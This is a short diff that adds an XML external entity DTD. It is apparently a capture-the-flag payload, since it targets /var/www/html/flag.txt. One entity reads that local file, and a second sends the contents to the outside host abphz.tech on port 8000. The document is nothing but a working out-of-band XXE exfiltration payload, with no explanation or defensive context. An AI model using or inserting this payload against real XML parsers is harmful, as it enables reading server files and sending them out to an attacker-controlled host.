@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "file:///var/www/html/flag.txt">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://abphz.tech:8000/%d;'>">
